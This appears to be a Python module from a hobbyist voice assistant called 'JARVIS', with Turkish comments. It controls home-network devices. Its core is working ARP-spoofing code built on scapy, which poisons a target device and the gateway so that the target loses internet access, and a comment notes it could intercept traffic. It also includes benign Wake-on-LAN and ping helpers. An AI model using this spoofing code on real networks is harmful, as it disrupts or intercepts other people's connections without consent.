"""
network/controller.py — JARVIS Ağ Kontrol Merkezi
- ARP spoofing ile seçili cihazın interneti kesme/açma
- Wake-on-LAN ile cihaz uyandırma
- Kesilen cihazları takip etme
- YÖNETİCİ YETKİSİ GEREKTİRİR (python'u "Yönetici olarak çalıştır")
"""

import asyncio
import socket
import struct
import threading
import time
from typing import Optional

try:
    from scapy.all import (ARP, Ether, sendp, get_if_hwaddr,
                            get_if_list, conf, srp)
    conf.verb = 0
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

from network.scanner import NetworkScanner, NetworkDevice


def _get_gateway() -> tuple[str, str]:
    """
    Varsayılan ağ geçidinin IP ve MAC adresini döner.
    Dönen: (gateway_ip, gateway_mac)
    """
    if not SCAPY_OK:
        return ("192.168.1.1", "ff:ff:ff:ff:ff:ff")

    # Default gateway IP'yi bul
    import subprocess
    try:
        # Windows
        out = subprocess.check_output("ipconfig", encoding="cp857", errors="ignore")
        for line in out.splitlines():
            if "Varsay" in line or "Default" in line or "Gateway" in line:
                parts = line.strip().split(":")
                if len(parts) > 1:
                    gw_ip = parts[-1].strip()
                    if gw_ip and gw_ip[0].isdigit():
                        break
        else:
            gw_ip = "192.168.1.1"
    except Exception:
        gw_ip = "192.168.1.1"

    # Gateway MAC'ini ARP ile bul
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
            timeout=2, retry=1
        )
        gw_mac = ans[0][1].hwsrc if ans else "ff:ff:ff:ff:ff:ff"
    except Exception:
        gw_mac = "ff:ff:ff:ff:ff:ff"

    return gw_ip, gw_mac


class NetworkController:
    def __init__(self, scanner: NetworkScanner):
        self.scanner = scanner
        self.blocked_devices: dict[str, threading.Event] = {}  # mac → stop_event
        self._iface = None
        self._my_mac = None
        self._gateway_ip = None
        self._gateway_mac = None

    def _init_network(self):
        """İlk kullanımda ağ bilgilerini hazırla."""
        if self._gateway_ip:
            return
        try:
            self._gateway_ip, self._gateway_mac = _get_gateway()
            self._iface = conf.iface
            self._my_mac = get_if_hwaddr(self._iface)
            print(f"🌐 Gateway: {self._gateway_ip} ({self._gateway_mac})")
            print(f"🖥️  Arayüz: {self._iface} ({self._my_mac})")
        except Exception as e:
            print(f"⚠️ Ağ init hatası: {e}")

    # ── ARP Spoofing Çekirdeği ────────────────────────────────────────────────
    def _spoof(self, target_ip: str, target_mac: str,
               spoof_ip: str, iface: str):
        """
        target'a 'spoof_ip'nin MAC'i benim diye yalan söyle.
        Bu paketi sürekli göndermek trafiği JARVIS'e yönlendirir (intercept)
        veya sadece gateway'e gönderince trafiği keser.
        """
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        sendp(pkt, iface=iface, verbose=False)

    def _restore(self, target_ip: str, target_mac: str,
                 source_ip: str, source_mac: str, iface: str):
        """ARP tablosunu eski haline getir (kesmeyi bitirince çağırılır)."""
        pkt = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )
        sendp(pkt, iface=iface, count=5, verbose=False)

    def _block_loop(self, device: NetworkDevice, stop_event: threading.Event):
        """
        Arka planda çalışan blok döngüsü.
        Cihaza: 'gateway benim' der → cihaz paketi bize gönderir → forward etmeyiz → internet kesilir.
        Gateway'e: 'cihaz benim' der → gateway paketi bize gönderir → forward etmeyiz → çift yönlü kesiş.
        """
        self._init_network()
        iface = self._iface
        gw_ip = self._gateway_ip
        gw_mac = self._gateway_mac
        dev_ip = device.ip
        dev_mac = device.mac

        print(f"✂️  {device.name} ({dev_ip}) interneti kesiliyor...")

        while not stop_event.is_set():
            try:
                # Cihaza: gateway benim
                self._spoof(dev_ip, dev_mac, gw_ip, iface)
                # Gateway'e: cihaz benim
                self._spoof(gw_ip, gw_mac, dev_ip, iface)
            except Exception as e:
                print(f"⚠️ Spoof hatası: {e}")
            time.sleep(1.5)

        # Temizle
        print(f"🔁 {device.name} ARP tablosu geri yükleniyor...")
        try:
            self._restore(dev_ip, dev_mac, gw_ip, gw_mac, iface)
            self._restore(gw_ip, gw_mac, dev_ip, dev_mac, iface)
        except Exception as e:
            print(f"⚠️ Restore hatası: {e}")

    # ── Public API ────────────────────────────────────────────────────────────
    async def block_device(self, query: str) -> str:
        """
        İsim veya IP ile cihazın internetini kes.
        'Jarvis, PS3'ün internetini kes'
        """
        if not SCAPY_OK:
            return "scapy kurulu değil Patron. pip install scapy"

        device = self.scanner.find(query)
        if not device:
            # Tarama yap, tekrar dene
            await self.scanner.scan()
            device = self.scanner.find(query)
        if not device:
            return f"'{query}' adlı cihaz ağda bulunamadı Patron."

        if device.mac in self.blocked_devices:
            return f"{device.name} zaten kesilmiş durumda Patron."

        # Öz Koruma Protokolü (Kendi kendini kesme)
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            if device.ip == local_ip:
                return "Patron, o IP benim üzerinde çalıştığım sistemin adresi. Kendi internetimi (hayat damarımı) kesemem!"
        except Exception:
            pass

        self._init_network()
        stop_event = threading.Event()
        self.blocked_devices[device.mac] = stop_event

        t = threading.Thread(
            target=self._block_loop,
            args=(device, stop_event),
            daemon=True
        )
        t.start()

        return (f"{device.name} cihazının internet bağlantısı kesildi Patron. "
                f"IP: {device.ip}")

    async def unblock_device(self, query: str) -> str:
        """Kesilen cihazın internetini geri aç."""
        if not SCAPY_OK:
            return "scapy kurulu değil Patron."

        device = self.scanner.find(query)
        if not device:
            await self.scanner.scan()
            device = self.scanner.find(query)
        if not device:
            return f"'{query}' adlı cihaz bulunamadı Patron."

        if device.mac not in self.blocked_devices:
            return f"{device.name} zaten açık durumda Patron."

        stop_event = self.blocked_devices.pop(device.mac)
        stop_event.set()  # Döngüyü durdur → restore tetiklenir

        await asyncio.sleep(2)  # Restore paketlerinin gitmesini bekle
        return f"{device.name} cihazının internet bağlantısı yeniden açıldı Patron."

    async def unblock_all(self) -> str:
        """Tüm kesimleri kaldır."""
        if not self.blocked_devices:
            return "Kesili cihaz yok zaten Patron."

        macs = list(self.blocked_devices.keys())
        for mac in macs:
            stop_event = self.blocked_devices.pop(mac)
            stop_event.set()

        await asyncio.sleep(2)
        return f"{len(macs)} cihazın bağlantısı geri açıldı Patron."

    def get_blocked_list(self) -> str:
        """Şu an kesili cihazları listele."""
        if not self.blocked_devices:
            return "Kesili cihaz yok Patron."
        lines = ["Şu an interneti kesili cihazlar:"]
        for mac in self.blocked_devices:
            dev = self.scanner.devices.get(mac)
            name = dev.name if dev else mac
            ip = dev.ip if dev else "?"
            lines.append(f"  ✂️  {name} — {ip}")
        return "\n".join(lines)

    # ── Wake-on-LAN ───────────────────────────────────────────────────────────
    async def wake_device(self, query: str, broadcast: str = "192.168.1.255") -> str:
        """
        Cihaza Wake-on-LAN magic packet gönder.
        Cihazın WoL desteklemesi ve BIOS'ta aktif olması gerekir.
        """
        device = self.scanner.find(query)
        if not device:
            return f"'{query}' cihazı veritabanında bulunamadı Patron. Önce ağ taraması yapayım."

        mac = device.mac.replace(":", "").replace("-", "")
        if len(mac) != 12:
            return f"Geçersiz MAC adresi Patron: {device.mac}"

        try:
            magic = bytes.fromhex("FF" * 6 + mac * 16)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.sendto(magic, (broadcast, 9))
            sock.close()
            return (f"{device.name} cihazına uyandırma sinyali gönderildi Patron. "
                    f"WoL destekliyorsa 30 saniye içinde açılır.")
        except Exception as e:
            return f"WoL paketi gönderilemedi Patron: {str(e)[:60]}"

    # ── Cihaz İzleme ─────────────────────────────────────────────────────────
    async def ping_device(self, query: str) -> str:
        """Belirli bir cihazın online olup olmadığını kontrol et."""
        device = self.scanner.find(query)
        if not device:
            return f"'{query}' ağ veritabanında yok Patron."

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            None,
            lambda: self._ping(device.ip)
        )
        status = "🟢 çevrimiçi" if result else "🔴 çevrimdışı"
        return f"{device.name} şu an {status} Patron. (IP: {device.ip})"

    def _ping(self, ip: str) -> bool:
        import subprocess
        try:
            res = subprocess.run(
                ["ping", "-n", "1", "-w", "1000", ip],
                capture_output=True, timeout=3
            )
            return res.returncode == 0
        except Exception:
            return False